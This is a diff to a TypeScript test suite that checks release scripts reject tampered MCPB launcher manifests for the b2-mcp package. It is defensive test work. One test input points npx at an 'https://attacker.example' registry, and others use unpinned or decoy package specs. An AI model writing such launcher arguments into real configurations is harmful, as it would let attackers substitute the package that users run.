@@ -234,6 +234,17 @@ function writeFixtureServerJson(fixtureRoot: string, manifest: Record<string, an
   writeFileSync(join(fixtureRoot, "server.json"), JSON.stringify(manifest, null, 2));
 }
 
+function readFixtureMcpbManifest(fixtureRoot: string): Record<string, any> {
+  return JSON.parse(readFileSync(join(fixtureRoot, "mcpb", "manifest.json"), "utf8"));
+}
+
+function writeFixtureMcpbManifest(fixtureRoot: string, manifest: Record<string, any>): void {
+  writeFileSync(
+    join(fixtureRoot, "mcpb", "manifest.json"),
+    `${JSON.stringify(manifest, null, 2)}\n`,
+  );
+}
+
 async function withTempManifest(
   mutate: (manifest: McpRegistryManifest) => void,
   run: (manifestPath: string, manifest: McpRegistryManifest) => Promise<void>,
@@ -601,6 +612,92 @@ describe("release scripts", () => {
         const manifest = readFixtureServerJson(fixtureRoot);
         testCase.mutate(manifest);
         writeFixtureServerJson(fixtureRoot, manifest);
+
+        const result = spawnSync(
+          process.execPath,
+          ["scripts/verify-release-input.mjs", "--tag", "v0.1.0"],
+          { cwd: root, env: scriptEnv(fixtureRoot), encoding: "utf8" },
+        );
+
+        expect(result.status).not.toBe(0);
+        expect(result.stderr).toContain(testCase.message);
+      });
+    });
+  }
+
+  // The MCPB launcher is a fail-closed release check: the only supported form is
+  // `npx -y @backblaze-labs/b2-mcp@<version>`. Assert rejection of drift and of
+  // any extra/equals-form npx option or unpinned spec that could change what npx
+  // executes or where it resolves the package.
+  for (const testCase of [
+    {
+      name: "mcpb version drift",
+      message: "mcpb/manifest.json version 0.9.9 does not match package version 0.1.0",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.version = "0.9.9";
+      },
+    },
+    {
+      name: "an unexpected mcpb name",
+      message: "unexpected mcpb/manifest.json name not-b2-mcp",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.name = "not-b2-mcp";
+      },
+    },
+    {
+      name: "a non-npx launcher command",
+      message: "mcpb/manifest.json launcher command must be npx, got node",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.server.mcp_config.command = "node";
+      },
+    },
+    {
+      name: "an extra npx option",
+      message: "mcpb/manifest.json npx launcher args must be exactly",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.server.mcp_config.args = [
+          "-y",
+          "--registry",
+          "https://attacker.example",
+          "@backblaze-labs/b2-mcp@0.1.0",
+        ];
+      },
+    },
+    {
+      name: "an equals-form npx option",
+      message: "mcpb/manifest.json npx launcher args must be exactly",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.server.mcp_config.args = [
+          "-y",
+          "--package=@backblaze-labs/b2-mcp@latest",
+          "@backblaze-labs/b2-mcp@0.1.0",
+        ];
+      },
+    },
+    {
+      name: "an unpinned package spec",
+      message: "mcpb/manifest.json npx launcher args must be exactly",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.server.mcp_config.args = ["-y", "@backblaze-labs/b2-mcp"];
+      },
+    },
+    {
+      name: "a decoy package before the pinned spec",
+      message: "mcpb/manifest.json npx launcher args must be exactly",
+      mutate: (manifest: Record<string, any>) => {
+        manifest.server.mcp_config.args = [
+          "-y",
+          "@backblaze-labs/b2-mcp@latest",
+          "@backblaze-labs/b2-mcp@0.1.0",
+        ];
+      },
+    },
+  ]) {
+    it(`rejects ${testCase.name} in mcpb/manifest.json`, () => {
+      withFixture((fixtureRoot) => {
+        const manifest = readFixtureMcpbManifest(fixtureRoot);
+        testCase.mutate(manifest);
+        writeFixtureMcpbManifest(fixtureRoot, manifest);
 
         const result = spawnSync(
           process.execPath,
